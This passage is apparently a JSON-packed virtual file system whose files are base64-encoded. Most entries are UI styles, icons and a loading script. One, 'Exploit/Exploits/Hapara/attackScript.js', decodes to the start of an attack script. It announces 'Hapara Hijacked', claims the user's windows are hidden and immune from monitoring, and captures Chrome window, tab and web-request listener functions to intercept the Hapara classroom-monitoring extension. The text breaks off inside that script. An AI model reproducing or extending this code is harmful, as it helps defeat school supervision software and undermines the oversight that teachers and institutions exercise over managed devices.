ZWwgew0KICAgIGRpc3BsYXk6IGZsZXg7DQogICAgaGVpZ2h0OiA1dmg7DQogICAgd2lkdGg6IDEwMCU7DQogICAgY3Vyc29yOiBwb2ludGVyOw0KICAgIG1hcmdpbi10b3A6IDF2aDsNCiAgICBtYXJnaW4tYm90dG9tOiAuNXZoOw0KfQ0KDQouZXhwbG9pdEdyb3VwIC5leHBsb2l0TGFiZWwgLmRyb3Bkb3duIHsNCgltYXJnaW4tbGVmdDogMnZ3Ow0KCW1hcmdpbi1yaWdodDogMXZ3Ow0KCW1hcmdpbi10b3A6IGF1dG87DQoJbWFyZ2luLWJvdHRvbTogYXV0bzsNCgl0cmFuc2l0aW9uOiB0cmFuc2Zvcm0gLjJzIGVhc2Utb3V0Ow0KCXRyYW5zZm9ybTogcm90YXRlKC05MGRlZyk7DQp9DQoNCi5leHBsb2l0R3JvdXAuYWN0aXZlIC5leHBsb2l0TGFiZWwgLmRyb3Bkb3duIHsNCgl0cmFuc2Zvcm06IHJvdGF0ZSgwZGVnKTsNCn0NCg0KLmV4cGxvaXRHcm91cCAuZXhwbG9pdExhYmVsIC50aXRsZSB7DQoJbWFyZ2luLXRvcDogYXV0bzsNCgltYXJnaW4tYm90dG9tOiBhdXRvOw0KfQ0KDQouZXhwbG9pdEdyb3VwIC5leHBsb2l0Qm9keSB7DQoJbWF4LWhlaWdodDogMDsNCglvdmVyZmxvdzogaGlkZGVuOw0KCXRyYW5zaXRpb246IG1heC1oZWlnaHQgLjJzIGVhc2Utb3V0Ow0KCW1hcmdpbi1yaWdodDogMnZ3Ow0KCXBhZGRpbmctcmlnaHQ6IDF2dzsNCn0NCg0KLmV4cGxvaXRHcm91cC5hY3RpdmUgLmV4cGxvaXRCb2R5IHsNCgltYXgtaGVpZ2h0OiAyNXZoOw0KCW92ZXJmbG93LXk6IHNjcm9sbDsNCn0NCg0KLmV4cGxvaXRHcm91cCAuZXhwbG9pdEJvZHkgLmluc3RydWN0aW9ucyB7DQoJbWFyZ2luLXRvcDogMDsNCgltYXJnaW4tYm90dG9tOiAwOw0KCW1hcmdpbi1sZWZ0OiA2dnc7DQoJcGFkZGluZy1ib3R0b206IDN2aDsNCglwYWRkaW5nLXRvcDogMDsNCn0NCg0KLmV4cGxvaXRHcm91cC5hY3RpdmU6OmFmdGVyIHsNCgljb250ZW50OiAiIjsNCgltYXJnaW46IDJ2aDsNCn0NCg0KOjotd2Via2l0LXNjcm9sbGJhciB7DQogICAgd2lkdGg6IDF2dzsNCn0NCiANCjo6LXdlYmtpdC1zY3JvbGxiYXItdHJhY2sgew0KICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMCwgMCwgMCwgLjEpOw0KfQ0KIA0KOjotd2Via2l0LXNjcm9sbGJhci10aHVtYiB7DQogICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgwLCAwLCAwLCAuMik7DQp9DQo=", "/system/res/drawable/exitFullscreenLight.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDB6IiBmaWxsPSJub25lIi8+DQogICAgPHBhdGggZD0iTTUgMTZoM3YzaDJ2LTVINXYyem0zLThINXYyaDVWNUg4djN6bTYgMTFoMnYtM2gzdi0yaC01djV6bTItMTFWNWgtMnY1aDVWOGgtM3oiLz4NCjwvc3ZnPg==", "/system": {}, "/system/app/Home/res/drawable/launchApp.svg": "PHN2ZyBmaWxsPSIjMDAwMDAwIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIj4NCiAgICA8cGF0aCBkPSJNMCAwaDI0djI0SDBWMHoiIGZpbGw9Im5vbmUiLz4NCiAgICA8cGF0aCBkPSJNNCAxMmwxLjQxIDEuNDFMMTEgNy44M1YyMGgyVjcuODNsNS41OCA1LjU5TDIwIDEybC04LTgtOCA4eiIvPg0KPC9zdmc+", "/system/script/init.js": "KGZ1bmN0aW9uKCkgew0KICAndXNlIHN0cmljdCc7DQogIHZhciBtb2RlbDsNCiAgdmFyIHZpZXc7DQogIHZhciBjb250cm9sbGVyOw0KICBtb2RlbCA9IHsNCiAgICBpbml0OiBmdW5jdGlvbigpIHsNCiAgICAgIC8qU3R5bGVzIGZvciBsb2FkaW5nIHNjcmVlbiovDQogICAgICB0aGlzLnJlcXVpcmVkU3R5bGVzID0gYA0KICAgICAgICBib2R5IHsNCiAgICAgICAgICBvdmVyZmxvdzogaGlkZGVuOw0KICAgICAgICAgIG1hcmdpbjogMDsNCiAgICAgICAgICBwYWRkaW5nOiAwOw0KICAgICAgICAgIGZvbnQtZmFtaWx5OiBSb2JvdG8sIHNhbnMtc2VyaWY7DQogICAgICAgIH0NCiAgICAgICAgLmxvYWRpbmdGcmFtZSB7DQogICAgICAgICAgd2lkdGg6IDEwMCU7DQogICAgICAgICAgaGVpZ2h0OiAxMDAlOw0KICAgICAgICAgIHBvc2l0aW9uOiBhYnNvbHV0ZTsNCiAgICAgICAgICB6LWluZGV4OiAyMTQ3NDgzNjQ3Ow0KICAgICAgICAgIG1hcmdpbjogMDsNCiAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjOUU5RTlFOw0KICAgICAgICB9DQogICAgICAgIC5sb2FkaW5nRnJhbWVfYmFubmVyIHsNCiAgICAgICAgICBwb3NpdGlvbjogYWJzb2x1dGU7DQogICAgICAgICAgdG9wOiAzNXZoOw0KICAgICAgICAgIGxlZnQ6IDUwdnc7DQogICAgICAgICAgZm9udC1zaXplOiAxMHZoOw0KICAgICAgICAgIGNvbG9yOiAjNjE2MTYxOw0KICAgICAgICAgIHRyYW5zZm9ybTogdHJhbnNsYXRlKC01MCUsIC01MCUpOw0KICAgICAgICB9DQogICAgICAgIC5sb2FkaW5nRnJhbWVfYmFubmVyOjpiZWZvcmUgew0KICAgICAgICAgIGNvbnRlbnQ6ICdMb2FkaW5nLi4uJzsNCiAgICAgICAgfQ0KICAgICAgICAubG9hZGluZ0ZyYW1lX2Zvb3RlciB7DQogICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAgICAgIGJvdHRvbTogMDsNCiAgICAgICAgICB3aWR0aDogMTAwJTsNCiAgICAgICAgICBoZWlnaHQ6IDEwdmg7DQogICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzYxNjE2MTsNCiAgICAgICAgfQ0KICAgICAgICAubG9hZGluZ0ZyYW1lX3Byb2dyZXNzQmFyIHsNCiAgICAgICAgICBoZWlnaHQ6IDF2aDsNCiAgICAgICAgICB0b3A6IDA7DQogICAgICAgICAgcG9zaXRpb246IGFic29sdXRlOw0KICAgICAgICAgIHdpZHRoOiAwJTsNCiAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjMjE5NkYzOw0KICAgICAgICAgIHRyYW5zaXRpb246IHdpZHRoIC4zczsNCiAgICAgICAgfQ0KICAgICAgICAubG9hZGluZ0ZyYW1lX21lc3NhZ2Ugew0KICAgICAgICAgIGN1cnNvcjogZGVmYXVsdDsNCiAgICAgICAgICBmb250LXNpemU6IDIuNXZoOw0KICAgICAgICAgIG1hcmdpbi10b3A6IDIuNXZoOw0KICAgICAgICAgIG1hcmdpbi1ib3R0b206IC41dmg7DQogICAgICAgICAgbWFyZ2luLWxlZnQ6IDJ2dzsNCiAgICAgICAgICBjb2xvcjogIzIxMjEyMTsNCiAgICAgICAgICB3aGl0ZS1zcGFjZTogbm93cmFwOw0KICAgICAgICAgIG92ZXJmbG93LXg6IGhpZGRlbjsNCiAgICAgICAgICB0ZXh0LW92ZXJmbG93OiBlbGxpcHNpczsNCiAgICAgICAgfQ0KICAgICAgICAubG9hZGluZ0ZyYW1lX3N1Yk1lc3NhZ2Ugew0KICAgICAgICAgIGN1cnNvcjogZGVmYXVsdDsNCiAgICAgICAgICBmb250LXNpemU6IDEuMjV2aDsNCiAgICAgICAgICBtYXJnaW46IDEuNXZoOw0KICAgICAgICAgIG1hcmdpbi1sZWZ0OiA0dnc7DQogICAgICAgICAgY29sb3I6ICMyMTIxMjE7DQogICAgICAgICAgd2hpdGUtc3BhY2U6IG5vd3JhcDsNCiAgICAgICAgICBvdmVyZmxvdy14OiBoaWRkZW47DQogICAgICAgICAgdGV4dC1vdmVyZmxvdzogZWxsaXBzaXM7DQogICAgICAgIH0NCiAgICAgICAgLmxvYWRpbmdGcmFtZV9zdWJNZXNzYWdlOjpiZWZvcmUgew0KICAgICAgICAgIGNvbnRlbnQ6ICdMb2FkaW5nICc7DQogICAgICAgIH0NCiAgICAgICAgLmxvYWRpbmdGcmFtZV9zdWJNZXNzYWdlOjphZnRlciB7DQogICAgICAgICAgY29udGVudDogJy4uLic7DQogICAgICAgIH0NCiAgICAgIGA7DQogICAgICB0aGlzLmVuY2hhbmNlU2NyaXB0cygpOw0KICAgIH0sDQogICAgc2NyaXB0czogWw0KICAgICAgew0KICAgICAgICB0aXRsZTogJ1ByZXBhcmluZyBGaWxlU3lzdGVtLi4uJywNCiAgICAgICAgdXJpOiAnc3lzdGVtL3NjcmlwdC9maWxlU3lzdGVtLmpzJywNCiAgICAgICAgd2VpZ2h0OiAyDQogICAgICB9LCB7DQogICAgICAgIHRpdGxlOiAnU3RhcnRpbmcgVUkuLi4nLA0KICAgICAgICB1cmk6ICdzeXN0ZW0vc2NyaXB0L2FwcC1mcmFtZXdvcmsuanMnLA0KICAgICAgICB3ZWlnaHQ6IDYNCiAgICAgIH0NCiAgICBdLA0KICAgIGVuY2hhbmNlU2NyaXB0czogZnVuY3Rpb24oKSB7DQogICAgICAvKkNhbGN1bGF0ZSBhZGRpdGlvbmFsIGRldGFpbHMgdGhhdCB3aWxsIG1ha2UgbGlmZSBlYXNpZXIuDQogICAgICBiYWxhbmNlZFdlaWdodCBpcyB0aGUgbnVtZXJpY2FsIGRlY2ltYWwgb2YgaG93IG11Y2ggc3BhY2UgYW55IHNjcmlwdCB3aWxsIG9jY3VweQ0KICAgICAgYnJlYWtwb2ludCBpcyBhIHN0cmluZyB1c2VkIGZvciBjb21wYXJpc29ucw0KICAgICAgKi8NCiAgICAgIHZhciBzY3JpcHRzID0gdGhpcy5zY3JpcHRzOw0KICAgICAgdmFyIHRvdGFsV2VpZ2h0ID0gMDsNCiAgICAgIHZhciBzdW0gPSAwOw0KICAgICAgdmFyIHByZXZpb3VzQnJlYWtwb2ludHMgPSAwOw0KICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gc2NyaXB0cy5sZW5ndGg7IGkgIT0gaWk7IGkrKykgew0KICAgICAgICB0b3RhbFdlaWdodCArPSBzY3JpcHRzW2ldLndlaWdodDsNCiAgICAgIH0NCiAgICAgIGZvciAobGV0IGkgPSAwLCBpaSA9IHNjcmlwdHMubGVuZ3RoOyBpICE9IGlpOyBpKyspIHsNCiAgICAgICAgc2NyaXB0c1tpXS5iYWxhbmNlZFdlaWdodCA9IHNjcmlwdHNbaV0ud2VpZ2h0IC8gdG90YWxXZWlnaHQ7DQogICAgICAgIHNjcmlwdHNbaV0uYmFsYW5jZWRXZWlnaHQgPSBzY3JpcHRzW2ldLmJhbGFuY2VkV2VpZ2h0LnRvRml4ZWQoMyk7DQogICAgICAgIHNjcmlwdHNbaV0uYmFsYW5jZWRXZWlnaHQgPSBwYXJzZUZsb2F0KHNjcmlwdHNbaV0uYmFsYW5jZWRXZWlnaHQpOw0KICAgICAgfQ0KICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gc2NyaXB0cy5sZW5ndGg7IGkgIT0gaWk7IGkrKykgew0KICAgICAgICBzdW0gKz0gc2NyaXB0c1tpXS5iYWxhbmNlZFdlaWdodDsNCiAgICAgIH0NCiAgICAgIGlmIChzdW0gIT0gMSkgew0KICAgICAgICBzY3JpcHRzWzBdLmJhbGFuY2VkV2VpZ2h0ICs9IHBhcnNlRmxvYXQoKDEgLSBzdW0pLnRvRml4ZWQoMykpOw0KICAgICAgfQ0KICAgICAgZm9yIChsZXQgaSA9IDAsIGlpID0gc2NyaXB0cy5sZW5ndGg7IGkgIT0gaWk7IGkrKykgew0KICAgICAgICBwcmV2aW91c0JyZWFrcG9pbnRzICs9IHNjcmlwdHNbaV0uYmFsYW5jZWRXZWlnaHQgKiAxMDA7DQogICAgICAgIHNjcmlwdHNbaV0uYnJlYWtwb2ludCA9IHByZXZpb3VzQnJlYWtwb2ludHMgKyAnJSc7DQogICAgICB9DQogICAgfQ0KICB9Ow0KDQogIGNvbnRyb2xsZXIgPSB7DQogICAgaW5pdDogZnVuY3Rpb24oKSB7DQogICAgICBtb2RlbC5pbml0KCk7DQogICAgICB2aWV3LmluaXQoKTsNCiAgICAgIHRoaXMubG9hZFNjcmlwdHMoKTsNCiAgICAgIHRoaXMubG9hZE5leHQoKTsNCiAgICB9LA0KICAgIGdldFN0eWxlczogZnVuY3Rpb24oKSB7DQogICAgICByZXR1cm4gbW9kZWwucmVxdWlyZWRTdHlsZXM7DQogICAgfSwNCiAgICBmaW5pc2hlZDogZnVuY3Rpb24oKSB7DQogICAgICBkb2N1bWVudC5ib2R5LnJlbW92ZUNoaWxkKHZpZXcubG9hZGluZ0ZyYW1lKTsNCiAgICB9LA0KICAgIGxvYWRTY3JpcHRzOiBmdW5jdGlvbigpIHsNCiAgICAgIHZpZXcubG9hZGluZ0ZyYW1lLmZvb3Rlci5hZGRFdmVudExpc3RlbmVyKCd0cmFuc2l0aW9uZW5kJywgZnVuY3Rpb24oKSB7DQogICAgICAgIHZpZXcubG9hZE5leHQoKTsNCiAgICAgICAgdmFyIGN1cnJlbnQgPSB2aWV3LmxvYWRpbmdGcmFtZS5mb290ZXIucHJvZ3Jlc3NCYXIuc3R5bGUud2lkdGg7DQogICAgICAgIHZhciBnb2FsID0gbW9kZWwuc2NyaXB0c1t0aGlzLmN1cnJlbnRUYXJnZXRdLmJyZWFrcG9pbnQ7DQogICAgICAgIGlmIChwYXJzZUZsb2F0KGN1cnJlbnQpID49IHBhcnNlRmxvYXQoZ29hbCkpIHsNCiAgICAgICAgICB0aGlzLmN1cnJlbnRUYXJnZXQrKzsNCiAgICAgICAgICBpZiAodGhpcy5jdXJyZW50VGFyZ2V0ICE9IG1vZGVsLnNjcmlwdHMubGVuZ3RoKSB7DQogICAgICAgICAgICB0aGlzLmxvYWROZXh0KCk7DQogICAgICAgICAgfSBlbHNlIHsNCiAgICAgICAgICAgIHRoaXMuZmluaXNoZWQoKTsNCiAgICAgICAgICB9DQogICAgICAgIH0NCiAgICAgIH0uYmluZCh0aGlzKSk7DQogICAgfSwNCiAgICBjdXJyZW50VGFyZ2V0OiAwLA0KICAgIGxvYWROZXh0OiBmdW5jdGlvbigpIHsNCiAgICAgIHZhciB0aXRsZSA9IG1vZGVsLnNjcmlwdHNbY29udHJvbGxlci5jdXJyZW50VGFyZ2V0XS50aXRsZTsNCiAgICAgIHZhciBzdWJUaXRsZSA9IG1vZGVsLnNjcmlwdHNbY29udHJvbGxlci5jdXJyZW50VGFyZ2V0XS51cmk7DQogICAgICB2aWV3LmxvYWRpbmdGcmFtZS5mb290ZXIubWVzc2FnZS5pbm5lclRleHQgPSB0aXRsZTsNCiAgICAgIHZpZXcubG9hZGluZ0ZyYW1lLmZvb3Rlci5zdWJNZXNzYWdlLmlubmVyVGV4dCA9IHN1YlRpdGxlOw0KICAgICAgbGV0IHNjcmlwdCA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOw0KICAgICAgc2NyaXB0LnNyYyA9IG1vZGVsLnNjcmlwdHNbY29udHJvbGxlci5jdXJyZW50VGFyZ2V0XS51cmk7DQogICAgICBzY3JpcHQuYWRkRXZlbnRMaXN0ZW5lcignbG9hZCcsIGZ1bmN0aW9uKCkgew0KICAgICAgICBkb2N1bWVudC5oZWFkLnJlbW92ZUNoaWxkKHNjcmlwdCk7DQogICAgICB9LmJpbmQoc2NyaXB0KSk7DQogICAgICBkb2N1bWVudC5oZWFkLmFwcGVuZENoaWxkKHNjcmlwdCk7DQogICAgfSwNCiAgICBnbG9iYWxpemU6IGZ1bmN0aW9uKGdsb2JhbE9iaikgew0KICAgICAgT2JqZWN0LmZyZWV6ZShnbG9iYWxPYmopOw0KICAgICAgd2luZG93LmxvYWRpbmdTY3JlZW4gPSBnbG9iYWxPYmo7DQogICAgfSwNCiAgICBnZXRXaWR0aDogZnVuY3Rpb24oc2NyaXB0TnVtKSB7DQogICAgICByZXR1cm4gbW9kZWwuc2NyaXB0c1tzY3JpcHROdW1dLmJhbGFuY2VkV2VpZ2h0ICogMTAwOw0KICAgIH0NCiAgfTsNCg0KICB2aWV3ID0gew0KICAgIHByZXZpb3VzV2lkdGhzOiAwLA0KICAgIGluaXQ6IGZ1bmN0aW9uKCkgew0KICAgICAgLypDbGVhbiB1cCovDQogICAgICBkb2N1bWVudC5jdXJyZW50U2NyaXB0LnBhcmVudE5vZGUucmVtb3ZlQ2hpbGQoZG9jdW1lbnQuY3VycmVudFNjcmlwdCk7DQogICAgICBkb2N1bWVudC50aXRsZSA9ICdBcHAgTGF1bmNoZXInOw0KICAgICAgLypFbmFibGUgU3R5bGVzKi8NCiAgICAgIHZhciBzdHlsZXM7DQogICAgICBzdHlsZXMgPSBjb250cm9sbGVyLmdldFN0eWxlcygpOw0KICAgICAgdGhpcy5zdHlsZUVsZW0gPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdzdHlsZScpOw0KICAgICAgdGhpcy5zdHlsZUVsZW0uaW5uZXJIVE1MID0gc3R5bGVzOw0KICAgICAgZG9jdW1lbnQuaGVhZC5hcHBlbmRDaGlsZCh0aGlzLnN0eWxlRWxlbSk7DQogICAgICAvKkFkZCB0byBET00qLw0KICAgICAgdGhpcy5sb2FkaW5nRnJhbWUgPSAoZnVuY3Rpb24oKSB7DQogICAgICAgIHZhciBsb2FkaW5nRnJhbWU7DQogICAgICAgIHZhciBiYW5uZXI7DQogICAgICAgIHZhciBmb290ZXI7DQogICAgICAgIHZhciBwcm9ncmVzc0JhcjsNCiAgICAgICAgdmFyIG1lc3NhZ2U7DQogICAgICAgIHZhciBzdWJNZXNzYWdlOw0KICAgICAgICBsb2FkaW5nRnJhbWUgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgbG9hZGluZ0ZyYW1lLmNsYXNzTmFtZSA9ICdsb2FkaW5nRnJhbWUnOw0KICAgICAgICBiYW5uZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdwJyk7DQogICAgICAgIGJhbm5lci5jbGFzc05hbWUgPSAnbG9hZGluZ0ZyYW1lX2Jhbm5lcic7DQogICAgICAgIGxvYWRpbmdGcmFtZS5iYW5uZXIgPSBiYW5uZXI7DQogICAgICAgIGxvYWRpbmdGcmFtZS5hcHBlbmRDaGlsZChiYW5uZXIpOw0KICAgICAgICBmb290ZXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgZm9vdGVyLmNsYXNzTmFtZSA9ICdsb2FkaW5nRnJhbWVfZm9vdGVyJzsNCiAgICAgICAgcHJvZ3Jlc3NCYXIgPSBkb2N1bWVudC5jcmVhdGVFbGVtZW50KCdkaXYnKTsNCiAgICAgICAgcHJvZ3Jlc3NCYXIuY2xhc3NOYW1lID0gJ2xvYWRpbmdGcmFtZV9wcm9ncmVzc0Jhcic7DQogICAgICAgIGZvb3Rlci5wcm9ncmVzc0JhciA9IHByb2dyZXNzQmFyOw0KICAgICAgICBmb290ZXIuYXBwZW5kQ2hpbGQocHJvZ3Jlc3NCYXIpOw0KICAgICAgICBtZXNzYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgncCcpOw0KICAgICAgICBtZXNzYWdlLmNsYXNzTmFtZSA9ICdsb2FkaW5nRnJhbWVfbWVzc2FnZSc7DQogICAgICAgIGZvb3Rlci5tZXNzYWdlID0gbWVzc2FnZTsNCiAgICAgICAgZm9vdGVyLmFwcGVuZENoaWxkKG1lc3NhZ2UpOw0KICAgICAgICBzdWJNZXNzYWdlID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgncCcpOw0KICAgICAgICBzdWJNZXNzYWdlLmNsYXNzTmFtZSA9ICdsb2FkaW5nRnJhbWVfc3ViTWVzc2FnZSc7DQogICAgICAgIGZvb3Rlci5zdWJNZXNzYWdlID0gc3ViTWVzc2FnZTsNCiAgICAgICAgZm9vdGVyLmFwcGVuZENoaWxkKHN1Yk1lc3NhZ2UpOw0KICAgICAgICBsb2FkaW5nRnJhbWUuZm9vdGVyID0gZm9vdGVyOw0KICAgICAgICBsb2FkaW5nRnJhbWUuYXBwZW5kQ2hpbGQoZm9vdGVyKTsNCiAgICAgICAgZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChsb2FkaW5nRnJhbWUpOw0KICAgICAgICByZXR1cm4gbG9hZGluZ0ZyYW1lOw0KICAgICAgICAvKg0KICAgICAgICAgIGxvYWRpbmdGcmFtZTp7DQogICAgICAgICAgICBiYW5uZXI6e30sDQogICAgICAgICAgICBmb290ZXI6ew0KICAgICAgICAgICAgICBwcm9ncmVzc0Jhcjp7fSwNCiAgICAgICAgICAgICAgbWVzc2FnZTp7fSwNCiAgICAgICAgICAgICAgc3ViTWVzc2FnZTp7fSwNCiAgICAgICAgICAgICAgcmVjb3ZlcnlCdG46e30NCiAgICAgICAgICAgIH0NCiAgICAgICAgICB9DQogICAgICAgICovDQogICAgICB9KSgpOw0KICAgICAgY29udHJvbGxlci5nbG9iYWxpemUodGhpcy5nbG9iYWwpOw0KICAgIH0sDQogICAgZ2xvYmFsOiB7DQogICAgICBzZXRNZXNzYWdlOiBmdW5jdGlvbihtc2cpIHsNCiAgICAgICAgdmlldy5sb2FkaW5nRnJhbWUuZm9vdGVyLm1lc3NhZ2UuaW5uZXJUZXh0ID0gbXNnOw0KICAgICAgfSwNCiAgICAgIHNldFBlcmNlbnRhZ2U6IGZ1bmN0aW9uKHBlcmNlbnRhZ2UpIHsNCiAgICAgICAgaWYgKHBlcmNlbnRhZ2UgPiAxMDAgfHwgcGVyY2VudGFnZSA8IDApIHsNCiAgICAgICAgICB0aHJvdyBuZXcgRXJyb3IoJ0ludmFsaWQgUGVyY2VudGFnZScpOw0KICAgICAgICB9DQogICAgICAgIHZhciB3aWR0aCA9IHBlcmNlbnRhZ2U7DQogICAgICAgIHdpZHRoICo9IG1vZGVsLnNjcmlwdHNbY29udHJvbGxlci5jdXJyZW50VGFyZ2V0XS5iYWxhbmNlZFdlaWdodDsNCiAgICAgICAgd2lkdGggKz0gdmlldy5wcmV2aW91c1dpZHRoczsNCiAgICAgICAgdmlldy5sb2FkaW5nRnJhbWUuZm9vdGVyLnByb2dyZXNzQmFyLnN0eWxlLndpZHRoID0gd2lkdGggKyAnJSc7DQogICAgICB9DQogICAgfSwNCiAgICBsb2FkTmV4dDogZnVuY3Rpb24oKSB7DQogICAgICB0aGlzLnByZXZpb3VzV2lkdGhzICs9IGNvbnRyb2xsZXIuZ2V0V2lkdGgoY29udHJvbGxlci5jdXJyZW50VGFyZ2V0KTsNCiAgICB9DQogIH07DQogIGNvbnRyb2xsZXIuaW5pdCgpOw0KfSkoKTsNCg==", "/system/fonts": {}, "/system/res/drawable/back10.svg": "PHN2ZyBmaWxsPSIjRkZGRkZGIiBoZWlnaHQ9IjI0IiB2aWV3Qm94PSIwIDAgMjQgMjQiIHdpZHRoPSIyNCIgeG1sbnM9Imh0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxuczp4bGluaz0iaHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluayI+DQogICAgPGRlZnM+DQogICAgICAgIDxwYXRoIGQ9Ik0wIDBoMjR2MjRIMFYweiIgaWQ9ImEiLz4NCiAgICA8L2RlZnM+DQogICAgPGNsaXBQYXRoIGlkPSJiIj4NCiAgICAgICAgPHVzZSBvdmVyZmxvdz0idmlzaWJsZSIgeGxpbms6aHJlZj0iI2EiLz4NCiAgICA8L2NsaXBQYXRoPg0KICAgIDxwYXRoIGNsaXAtcGF0aD0idXJsKCNiKSIgZD0iTTEyIDVWMUw3IDZsNSA1VjdjMy4zIDAgNiAyLjcgNiA2cy0yLjcgNi02IDYtNi0yLjctNi02SDRjMCA0LjQgMy42IDggOCA4czgtMy42IDgtOC0zLjYtOC04LTh6bS0xLjEgMTFIMTB2LTMuM0w5IDEzdi0uN2wxLjgtLjZoLjFWMTZ6bTQuMy0xLjhjMCAuMyAwIC42LS4xLjhsLS4zLjZzLS4zLjMtLjUuMy0uNC4xLS42LjEtLjQgMC0uNi0uMS0uMy0uMi0uNS0uMy0uMi0uMy0uMy0uNi0uMS0uNS0uMS0uOHYtLjdjMC0uMyAwLS42LjEtLjhsLjMtLjZzLjMtLjMuNS0uMy40LS4xLjYtLjEuNCAwIC42LjFjLjIuMS4zLjIuNS4zcy4yLjMuMy42LjEuNS4xLjh2Ljd6bS0uOS0uOHYtLjVzLS4xLS4yLS4xLS4zLS4xLS4xLS4yLS4yLS4yLS4xLS4zLS4xLS4yIDAtLjMuMWwtLjIuMnMtLjEuMi0uMS4zdjJzLjEuMi4xLjMuMS4xLjIuMi4yLjEuMy4xLjIgMCAuMy0uMWwuMi0uMnMuMS0uMi4xLS4zdi0xLjV6Ii8+DQo8L3N2Zz4=", "/system/app/Exploit/Exploits/Hapara/attackScript.js": "KGZ1bmN0aW9uKCkgew0KICAndXNlIHN0cmljdCc7DQogIGNocm9tZS5ub3RpZmljYXRpb25zLmNyZWF0ZSgnU1RBUlRVUF9URVNUJywgew0KICAgIHR5cGU6ICdiYXNpYycsDQogICAgaWNvblVybDogJ2ljb25zL2ljb24xMjgucG5nJywNCiAgICB0aXRsZTogJ0hhcGFyYSBIaWphY2tlZCcsDQogICAgbWVzc2FnZTogJ1lvdXIgQ3VycmVudCBXaW5kb3dzIEFyZSBIaWRkZW4gYW5kIEltbXVuZS4gTWFrZSBzdXJlIHRvIGxlYXZlIGF0IGxlYXN0IG9uZSBub24taGlkZGVuIHdpbmRvdyBvcGVuLCBvciBlbHNlIHVucHJlZGljdGFibGUgYnVncyBtYXkgb2NjdXIuIFdlIGFyZSBjdXJyZW50bHkgd29ya2luZyBvbiBGb2N1c2VkIEJyb3dzaW5nIGFuZCBTdG9yYWdlIGludGVyY2VwdGlvbi4nLA0KICAgIHByaW9yaXR5OiAyLA0KICAgIHJlcXVpcmVJbnRlcmFjdGlvbjogdHJ1ZQ0KICB9KTsNCiAgLypTdG9yZSBXaW5kb3cgT2JqZWN0cyBIZXJlKi8NCiAgdmFyIGhpZGRlbiA9IFtdOw0KICB2YXIgdW5wcm90ZWN0ZWQgPSBbXTsNCiAgdmFyIHF1ZXVlID0gew0KICAgIC8qT25seSB1c2VkIGZvciBldmVudCBsaXN0ZW5lcnMqLw0KICAgIHdpbmRvd3M6IHsNCiAgICAgIGZvY3VzQ2hhbmdlZDogW10sDQogICAgICBjcmVhdGVkOiBbXQ0KICAgIH0sDQogICAgdGFiczogew0KICAgICAgb25DcmVhdGVkOiBbXSwNCiAgICAgIG9uVXBkYXRlZDogW10sDQogICAgICBvbkFjdGl2YXRlZDogW10sDQogICAgICBvbkF0dGFjaGVkOiBbXSwNCiAgICAgIG9uUmVwbGFjZWQ6IFtdDQogICAgfSwNCiAgICB3ZWJSZXF1ZXN0OiB7DQogICAgICBvbkJlZm9yZVJlZGlyZWN0OiBbXSwNCiAgICAgIG9uQmVmb3JlUmVxdWVzdDogW10sDQogICAgICBvbkNvbXBsZXRlZDogW10sDQogICAgICBvblNlbmRIZWFkZXJzOiBbXSwNCiAgICAgIG9uQXV0aFJlcXVpcmVkOiBbXSwNCiAgICAgIG9uUmVzcG9uc2VTdGFydGVkOiBbXQ0KICAgIH0NCiAgfTsNCiAgdmFyIF9hcGkgPSB7DQogICAgd2luZG93czogew0KICAgICAgb25DcmVhdGVkOiBjaHJvbWUud2luZG93cy5vbkNyZWF0ZWQuYWRkTGlzdGVuZXIsDQogICAgICBvbkZvY3VzQ2hhbmdlZDogY2hyb21lLndpbmRvd3Mub25Gb2N1c0NoYW5nZWQuYWRkTGlzdGVuZXIsDQogICAgICBnZXRDdXJyZW50OiBjaHJvbWUud2luZG93cy5nZXRDdXJyZW50LA0KICAgICAgZ2V0TGFzdEZvY3VzZWQ6IGNocm9tZS53aW5kb3dzLmdldExhc3RGb2N1c2VkLA0KICAgICAgZ2V0QWxsOiBjaHJvbWUud2luZG93cy5nZXRBbGwNCiAgICB9LA0KICAgIHRhYnM6IHsNCiAgICAgIG9uQ3JlYXRlZDogY2hyb21lLnRhYnMub25DcmVhdGVkLmFkZExpc3RlbmVyLA0KICAgICAgb25VcGRhdGVkOiBjaHJvbWUudGFicy5vblVwZGF0ZWQuYWRkTGlzdGVuZXIsDQogICAgICBvbkFjdGl2YXRlZDogY2hyb21lLnRhYnMub25BY3RpdmF0ZWQuYWRkTGlzdGVuZXIsDQogICAgICBvbkF0dGFjaGVkOiBjaHJvbWUudGFicy5vbkF0dGFjaGVkLmFkZExpc3RlbmVyLA0KICAgICAgb25SZXBsYWNlZDogY2hyb21lLnRhYnMub25SZXBsYWNlZC5hZGRMaXN0ZW5lciwNCiAgICAgIHF1ZXJ5OiBjaHJvbWUudGFicy5xdWVyeSwNCiAgICAgIGdldEN1cnJlbnQ6IGNocm9tZS50YWJzLmdldEN1cnJlb